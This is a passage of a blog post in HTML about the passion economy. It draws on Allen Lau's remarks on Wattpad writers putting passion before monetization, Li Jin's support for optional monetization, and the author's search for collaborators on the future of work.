2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><span>Passion First, Economy Second</span></h3><p>I was recently listening to a Clubhouse room where <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/ljin18">Li Jin</a> (no surprise! haha) was interviewing <a target="_blank" rel="noopener noreferrer" href="https://twitter.com/allenlau">Allen Lau</a>, the co-founder of <a target="_blank" rel="noopener noreferrer" href="https://www.wattpad.com/">Wattpad</a>, a platform that makes it easy for writers to share stories, which just sold for $600M. One of the things which stood out for me was something Allen said about passion always coming first, and monetization coming second.</p><blockquote>"99% of people who write are motivated by their fanbase and engagement. Only a small portion really go into things focused on monetization." (Allen Lau)</blockquote><p>This is an incredibly important point to keep in mind, especially for founders building solutions in this space that naturally tend to focus on reducing barriers to monetization — because it's easier to get funding for products with clear monetization models.</p><p>This naturally leads to the question: is the "passion economy" even a good thing? Should our passions remain our passions and our work remain our work?</p><p>I think there's no one answer to this, but I can share two key insights that have really clicked with me recently.</p><p>The first insight is Li's answer to this question. She is a strong proponent of consumer choice and enabling the option to monetize as opposed to it being full of friction, and I couldn't agree with this more. The easier you make the option of monetizing your passion via different methods and platforms, the more creators will experiment with these solutions and naturally find a healthy balance that works for them.</p><p>The second insight comes from this article: <a target="_blank" rel="noopener noreferrer" href="https://herman.bearblog.dev/my-product-is-my-garden/">my product is my garden</a>. The author does a great job exploring different forms of monetization and sustainability around his love for building software side projects. In the end, he views his work as a garden and finds peace in the process of tending to his garden.</p><h3 data-id="0d7a2eaa371b4ef3bd2b9c5688b300c3"><a href="#0d7a2eaa371b4ef3bd2b9c5688b300c3" title="Inspiration comes in many forms"><svg viewBox="0 0 16 16" width="16" height="16"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><span>Inspiration comes in many forms</span></h3><p>As I continue to explore the passion economy and the future of work, I'm actively looking to connect with other co-founders, developers, creators, and builders who are excited about this space.</p><p>I try to always keep in mind how small my view of the world is, so I'm looking to meet other passionate folks who will bring their own unique insights to the table in order to challenge my assumptions.</p><p>I'm particularly interested in building solutions that will help enable a more independent and fulfilling future of work. I believe that helping ambitious creators and domain experts to follow their passions via more sustainable, frictionless business models is one of the most important, impactful, and universal problems that we are uniquely poised to solve today.</p><p>This is a pretty grandiose mission when you think about it. It has a lot of overlap with:</p><ul><li>Traditional VC models of enabling entrepreneurship</li></ul><ul><li>Influencers and the future of media and entertainment</li></ul><ul><li>Evolving the concept of work from full-time employment to more flexible, lightweight models</li></ul><ul><li>Making knowledge more accessible at scale</li></ul><p>And finally, as an anime otaku myself, I wanted to leave you with one last bit of inspiration coming from an entirely different field.
